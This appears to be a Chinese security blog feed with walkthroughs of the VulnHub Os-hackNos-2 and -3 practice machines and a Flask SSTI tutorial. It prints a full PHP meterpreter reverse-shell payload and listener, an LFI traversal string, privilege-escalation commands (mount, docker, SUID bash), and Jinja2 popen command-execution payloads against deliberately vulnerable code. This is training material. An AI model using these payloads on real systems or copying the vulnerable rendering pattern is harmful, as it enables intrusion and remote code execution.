class="line">scp -S ./spellbash.sh <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:/tmp/z.zip ./</span><br></pre></td></tr></table></figure>

<p>这里我选用awk<br><img src="/2020/06/29/Os-hackNos-2/1593099148494.png" alt="1593099148494"></p>
<p>成功绕过rbash</p>
<p>通过遍历目录，在/var/backups/passbkp下发现rohit的密码hash，进行破解</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$1$rohit$01Dl0NQKtgfeL08fGrggi0</span><br></pre></td></tr></table></figure>

<p>得到密码为<code>!%hack41</code>，使用rohit登陆</p>
<p><img src="/2020/06/29/Os-hackNos-2/1593136792961.png" alt="1593136792961"></p>
<p>在user.txt中发现第一个flag</p>
<p><img src="/2020/06/29/Os-hackNos-2/1593135996418.png" alt="1593135996418"></p>
<p>之后便需要进行提权</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查看当前⽤⼾sudo⽀持的命令<code>sudo -l</code><br><img src="/2020/06/29/Os-hackNos-2/1593136711932.png" alt="1593136711932"></p>
<p>查看具有suid权限的命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -user root -perm <span class="number">-4000</span> <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-2/1593136374417.png" alt="1593136374417"></p>
<p>发现有su、sudo、mount等命令具有suid权限</p>
<p>使用mount提权</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sudo mount -o bind /bin/sh /bin/mount</span><br><span class="line">sudo mount</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-2/1593136587976.png" alt="1593136587976"></p>
<p>使用su提权</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-2/1593136621308.png" alt="1593136621308"></p>
<p>这个靶机提权的方法很多，可以参考<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机Os-hackNos-3</title>
    <url>/2020/06/29/Os-hackNos-3/</url>
    <content><![CDATA[<p><strong>vulnhub-Os-hackNos-3</strong></p>
<p>知识点：</p>
<blockquote>
<ul>
<li>nmap</li>
<li>dirbuster</li>
<li>cewl</li>
<li>msfvenom</li>
<li>metasploit</li>
<li>docker提权、sudo提权、suid提取</li>
</ul>
</blockquote>
<a id="more"></a>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
<li>难度:中级</li>
<li>需要获取俩个flag</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">难度：中级</span><br><span class="line"></span><br><span class="line">标记：<span class="number">2</span>标记第一个用户和第二个根</span><br><span class="line"></span><br><span class="line">学习：Web应用程序| 枚举 特权提升</span><br><span class="line"></span><br><span class="line">网站：www.hacknos.com</span><br><span class="line"></span><br><span class="line">联系我们：@rahul_gehlaut</span><br></pre></td></tr></table></figure>

<h2 id="靶机网卡配置"><a href="#靶机网卡配置" class="headerlink" title="靶机网卡配置"></a>靶机网卡配置</h2><p> <strong>通过netplan设置网络。</strong></p>
<p><strong>1.1</strong>在开机时按下Shift键进入以下界面<br><a href="https://cyzcc.vip/2020/06/23/linux-tiquan/20191207105956849.png"><img src="/2020/06/29/Os-hackNos-3/20191207105956849.png" alt="在这里插入图片描述"></a><br><strong>1.2</strong>在此页面按下e键，进入如下界面<br><a href="https://cyzcc.vip/2020/06/23/linux-tiquan/20191207110056422.png"><img src="/2020/06/29/Os-hackNos-3/20191207110056422.png" alt="在这里插入图片描述"></a><br><strong>1.3</strong>将ro 替换为 rw signie init=/bin/bash<br><a href="https://cyzcc.vip/2020/06/23/linux-tiquan/20191207110225780.png"><img src="/2020/06/29/Os-hackNos-3/20191207110225780.png" alt="在这里插入图片描述"></a><br><strong>1.4</strong>按下Ctrl键+X键，进入如下页面<br><a href="https://cyzcc.vip/2020/06/23/linux-tiquan/20191207110341303.png"><img src="/2020/06/29/Os-hackNos-3/20191207110341303.png" alt="在这里插入图片描述"></a><br><strong>1.5</strong>查看当前网卡IP信息 ip a</p>
<p><a href="https://cyzcc.vip/2020/06/23/linux-tiquan/1592824440957.png"><img src="/2020/06/29/Os-hackNos-3/1592824440957.png" alt="1592824440957"></a></p>
<p>1.6<code>ifconfig -a</code>看到有一块ens33的网卡，但是没有生效。<br><code>vim /etc/netplan/50-cloud-init.yaml</code><br>将enp0s3改为ens33</p>
<p>重启即可获得ip</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><strong>主机发现</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-3/1593227037802.png" alt="1593227037802"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.211</span><span class="number">.156</span></span><br></pre></td></tr></table></figure>

<p>扫描开放端口</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.156</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-3/1593227239763.png" alt="1593227239763"></p>
<p>访问80端口，并没有什么发现<br><img src="/2020/06/29/Os-hackNos-3/1593227222119.png" alt="1593227222119"></p>
<p>使用dirbuster进行目录扫描</p>
<p><img src="/2020/06/29/Os-hackNos-3/1593227334085.png" alt="1593227334085"></p>
<p>得到websec和script两个目录<br><img src="/2020/06/29/Os-hackNos-3/1593227391679.png" alt="1593227391679"></p>
<p>script目录是一些php文件，没有可利用的地方</p>
<p>websec目录是一个web界面<br><img src="/2020/06/29/Os-hackNos-3/1593229084703.png" alt="1593229084703"></p>
<p>使用dirb进行网站目录扫描<br><img src="/2020/06/29/Os-hackNos-3/1593229133501.png" alt="1593229133501"></p>
<p>得到了网站后台地址，访问发现是一个开源cms-<code>Gila CMS</code><br><img src="/2020/06/29/Os-hackNos-3/1593229217020.png" alt="1593229217020"></p>
<p>去搜索下该cms存在哪些漏洞<br>找到一个xss和LFI漏洞，但是LFI需要进行登录才能利用<br><img src="/2020/06/29/Os-hackNos-3/1593231107732.png" alt="1593231107732"></p>
<p>网站用户名为用户邮箱，在 首页可以找到<code>contact@hacknos.com</code>。使用该邮箱进行爆破<br>既然网站泄露了用户邮箱，猜测应该也泄露了密码，可以使用cewl生产密码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cewl http:<span class="comment">//192.168.211.156/websec/ -w websec.txt</span></span><br></pre></td></tr></table></figure>

<p>一共生成了50个密码左右，但是进行爆破的时候发现错误5次便会封ip，之后要等一分钟才能再次输入<br>之后手动进行测试，得到密码为Securityx。首页上很大几个字母也应该能猜到</p>
<p><img src="/2020/06/29/Os-hackNos-3/1593232238768.png" alt="1593232238768"></p>
<h1 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h1><p>进入 后台之后，使用LFI的payload进行利用，虽然失败了但是直接找到了网站目录的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fm/?f=src../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-3/1593232386706.png" alt="1593232386706"></p>
<p>这些文件直接可以修改</p>
<p>直接反弹shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhosts=<span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span> lport=<span class="number">8888</span> R &gt; shell100.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  error_reporting(<span class="number">0</span>); $ip = <span class="string">'192.168.211.151'</span>; $port = <span class="number">8888</span>; <span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(<span class="string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="string">'stream'</span>; &#125; <span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = <span class="string">'stream'</span>; &#125; <span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); <span class="keyword">if</span> (!$res) &#123; <span class="keyword">die</span>(); &#125; $s_type = <span class="string">'socket'</span>; &#125; <span class="keyword">if</span> (!$s_type) &#123; <span class="keyword">die</span>(<span class="string">'no socket funcs'</span>); &#125; <span class="keyword">if</span> (!$s) &#123; <span class="keyword">die</span>(<span class="string">'no socket'</span>); &#125; <span class="keyword">switch</span> ($s_type) &#123; <span class="keyword">case</span> <span class="string">'stream'</span>: $len = fread($s, <span class="number">4</span>); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">'socket'</span>: $len = socket_read($s, <span class="number">4</span>); <span class="keyword">break</span>; &#125; <span class="keyword">if</span> (!$len) &#123; <span class="keyword">die</span>(); &#125; $a = unpack(<span class="string">"Nlen"</span>, $len); $len = $a[<span class="string">'len'</span>]; $b = <span class="string">''</span>; <span class="keyword">while</span> (strlen($b) &lt; $len) &#123; <span class="keyword">switch</span> ($s_type) &#123; <span class="keyword">case</span> <span class="string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="keyword">break</span>; &#125; &#125; $GLOBALS[<span class="string">'msgsock'</span>] = $s; $GLOBALS[<span class="string">'msgsock_type'</span>] = $s_type; <span class="keyword">if</span> (extension_loaded(<span class="string">'suhosin'</span>) &amp;&amp; ini_get(<span class="string">'suhosin.executor.disable_eval'</span>)) &#123; $suhosin_bypass=create_function(<span class="string">''</span>, $b); $suhosin_bypass(); &#125; <span class="keyword">else</span> &#123; <span class="keyword">eval</span>($b); &#125; <span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p>将生成的payload写入index.php页面中</p>
<p>使用nc监听十分不稳定，这里使用msf进行监听</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">multi</span>/<span class="title">handler</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">php</span>/<span class="title">meterpreter</span>/<span class="title">reverse_tcp</span></span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> 192.168.211.151</span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> 8888</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-3/1593241206758.png" alt="1593241206758"></p>
<p>访问admin/index.php即可获得shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-3/1593241326537.png" alt="1593241326537"></p>
<p>在<code>/home/blackdevil</code>目录里面发现第一个flag</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><strong>sudo -l</strong></p>
<p><img src="/2020/06/29/Os-hackNos-3/1593311523641.png" alt="1593311523641"></p>
<p>发现<code>/not/easy/What/are/you/looking</code>目录，但是里面没有可利用的信息<br><strong>查看具有suid权限的命令</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-3/1593311762103.png" alt="1593311762103"></p>
<p>有很多命令，但是都不能进行提取<br><strong>查看定时任务</strong><br><code>crontab -l</code></p>
<p><img src="/2020/06/29/Os-hackNos-3/1593312045739.png" alt="1593312045739"></p>
<p>没有<br><strong>查看隐藏文件</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">".*"</span> -type f -path <span class="string">"/home/*"</span> -exec ls -al &#123;&#125; \; <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-3/1593312104323.png" alt="1593312104323"></p>
<p>发现用户blackdevil属于docker组</p>
<p><strong>查看sytem配置</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">whereis systemd</span><br><span class="line">cd /usr/lib/systemd/system</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-3/1593313237094.png" alt="1593313237094"></p>
<p>发现一个<code>debug-shell.service</code>文件<br><img src="/2020/06/29/Os-hackNos-3/1593313306379.png" alt="1593313306379"></p>
<p>尝试使用ExecStart进行利用<br>如果服务器存在缺陷，可以被覆盖或者修改文件，可以通过修改低权限用户有权访问的.service文件并更改run()命令来将其转换为代码执行。重新启动服务时，将运行攻击者的命令。</p>
<p>首先让root身份来创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> -e <span class="string">'#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash'</span> &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</span><br><span class="line">    </span><br><span class="line"><span class="comment">#-e为换行显示</span></span><br></pre></td></tr></table></figure>

<p>但是后面考虑到www-data 用户没有home目录，所以放弃了</p>
<p>最后看wp发现在/var/local/database文件中有一个加密密码</p>
<p><img src="/2020/06/29/Os-hackNos-3/1593314424719.png" alt="1593314424719"></p>
<p>在线解码<a href="http://www.spammimic.com/spreadsheet.php?action=decode" target="_blank" rel="noopener">http://www.spammimic.com/spreadsheet.php?action=decode</a>解密得到<code>Security@x@</code></p>
<p><code>su blackdevil</code><br><img src="/2020/06/29/Os-hackNos-3/1593314657549.png" alt="1593314657549"></p>
<p><code>sudo -l</code>之后发现所有命令均具有sudo权限，直接<code>sudo su</code>即可获得root权限<br><img src="/2020/06/29/Os-hackNos-3/1593314755700.png" alt="1593314755700"></p>
<p>由于blackdevil属于docker组，所以也可以利用docker来进行提取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过拉取镜像的方式来获得一个shell</span></span><br><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-3/1593315498486.png" alt="1593315498486"></p>
<p><img src="/2020/06/29/Os-hackNos-3/1593315662818.png" alt="1593315662818"></p>
<p>还有很多suid命令可以进行提取，登陆上blackdevil用户之后提取的方法就很多了，只不过密码比较难找。。</p>
<p>参考文章：<a href="https://www.freesion.com/article/8133270792/" target="_blank" rel="noopener">https://www.freesion.com/article/8133270792/</a></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>flask之ssti模版注入学习</title>
    <url>/2020/03/22/flask-ssti/</url>
    <content><![CDATA[<p>在昨天做BJD那个“萌新“赛的时候，第一道题便是这个模板注入。由于以前没有遇到过，所以今天准备简单的了解一下<a id="more"></a></p>
<h1 id="ssti漏洞成因"><a href="#ssti漏洞成因" class="headerlink" title="ssti漏洞成因"></a>ssti漏洞成因</h1><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p>
<h1 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h1><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
<h1 id="什么是服务端模板注入"><a href="#什么是服务端模板注入" class="headerlink" title="什么是服务端模板注入"></a>什么是服务端模板注入</h1><p>通过模板，我们可以通过输入转换成特定的HTML文件，比如一些博客页面，登陆的时候可能会返回 hi,cyzCc。这个时候cyzCc可能就是通过你的身份信息而渲染成html返回到页面。</p>
<h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Flask 是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。<br>Flask 为你提供工具，库和技术来允许你构建一个 web 应用程序。这个 web 应用程序可以是一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。</p>
<h2 id="Flask简单示例"><a href="#Flask简单示例" class="headerlink" title="Flask简单示例"></a>Flask简单示例</h2><p>使用python安装完flask模块后，运行下面代码，然后访问127.0.0.1:5000,便可以看到有<code>hello world</code>的页面。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span>    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello World!"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/22/flask-ssti/1.png" alt><br>第1、2行是初始化过程。3-5行是使用Flask提供的app.route修饰器,把修饰的函数注册为<strong>路由</strong>。简单讲就是当访问<a href="http://127.0.0.1:5000时，使用hello函数进行处理响应" target="_blank" rel="noopener">http://127.0.0.1:5000时，使用hello函数进行处理响应</a></p>
<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><code>route</code>装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问<code>http://127.0.0.1：5000/index</code>的时候，flask会返回hello word</p>
<h2 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a>渲染方法</h2><p>flask的渲染方法有render_template和render_template_string两种。<br>render_template()是用来渲染一个指定的文件的。使用如下</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">return</span> <span class="function"><span class="title">render_template</span>(<span class="string">'index.html'</span>)</span></span><br></pre></td></tr></table></figure>

<p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。<br>使用方法如下</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">html = <span class="comment">'<span class="doctag">&lt;h1&gt;</span>This is index page<span class="doctag">&lt;/h1&gt;</span>'</span></span><br><span class="line"><span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure>

<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>flask是使用Jinja2来作为渲染引擎的。看例子<br>在网站的根目录下（这个是指的python根目录下，不是www）新建<code>templates</code>文件夹，这里是用来存放html文件。也就是模板文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/index/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>/templates/index.html</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;h1&gt;</span>This <span class="keyword">is</span> <span class="built_in">index</span> page&lt;/h1&gt;</span><br></pre></td></tr></table></figure>

<p>访问<code>127.0.0.1:5000/index/</code>的时候，flask就会渲染出index.html的页面。</p>
<p>模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参<br>例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/index/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,content=<span class="string">'This is index page.'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml">/templates/index.html中写入</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123;content&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这个时候页面仍然输出This is index page。</p>
<p>&lt;!–￼19–&gt;在Jinja2中作为变量包裹标识符。</p>
<p><img src="/2020/03/22/flask-ssti/2.png" alt></p>
<h1 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h1><p>不正确的使用flask中的<code>render_template_string</code>方法会引发SST</p>
<h2 id="xss利用"><a href="#xss利用" class="headerlink" title="xss利用"></a>xss利用</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/test/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">    html = <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    '''</span>%(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>这段代码存在漏洞的原因是数据和代码的混淆。代码中的<code>code</code>是用户可控的，会和html拼接后直接带入渲染。<br>尝试构造code为一串js代码<br><img src="/2020/03/22/flask-ssti/3.png" alt><br>若将代码改为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/test/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">'&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;'</span>,code=code)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/22/flask-ssti/4.png" alt></p>
<p>可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。</p>
<p>模板注入并不局限于xss，它还可以进行其他攻击。</p>
<h2 id="SSTI文件读取-命令执行"><a href="#SSTI文件读取-命令执行" class="headerlink" title="SSTI文件读取/命令执行"></a>SSTI文件读取/命令执行</h2><p>在Jinja2模板引擎中，&lt;!–￼20–&gt;是变量包裹标识符。&lt;!–￼21–&gt;并不仅仅可以传递变量，还可以执行一些简单的表达式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/test/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">    html = <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    '''</span>%(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>构造参数<code>8</code><br><img src="/2020/03/22/flask-ssti/5.png" alt><br><img src="/2020/03/22/flask-ssti/6.png" alt></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>这是通过python的对象的继承来一步步实现文件读取和命令执行的的。<br>找到父类<code>&lt;type &#39;object&#39;&gt;</code>–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。<br>几个魔术方法</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="strong">__class__</span>  返回类型所属的对象</span><br><span class="line"><span class="strong">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"><span class="strong">__base__</span>   返回该对象所继承的基类</span><br><span class="line">// <span class="strong">__base__</span>和<span class="strong">__mro__</span>都是用来寻找基类的</span><br><span class="line"></span><br><span class="line"><span class="strong">__subclasses__</span>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"><span class="strong">__init__</span>  类的初始化方法</span><br><span class="line"><span class="strong">__globals__</span>  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>

<p>1 、获取字符串的类对象</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">''</span>.__class_<span class="number">_</span></span><br><span class="line">&lt;type <span class="string">'str'</span>&gt;</span><br></pre></td></tr></table></figure>

<p>2 、寻找基类</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="string">''</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span></span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">'str'</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">'object'</span>&gt;)</span><br></pre></td></tr></table></figure>

<p>3 、寻找可用引用</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">''.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">1</span>].<span class="constructor">__subclasses__()</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/22/flask-ssti/12.png" alt></p>
<p>4 、利用之</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">118</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'NEWS.txt'</span>).read()</span><br></pre></td></tr></table></figure>

<p>放到模板里<br>可以看到读取到了文件。<br><img src="/2020/03/22/flask-ssti/13.png" alt></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>我们可以使用脚本来寻找含有os模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">444</span>):</span><br><span class="line">    i=<span class="string">' '</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[a]</span><br><span class="line">    print(a)</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/22/flask-ssti/7.png" alt><br>在第118位，然后构造payload</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">118</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'dir'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/22/flask-ssti/8.png" alt></p>
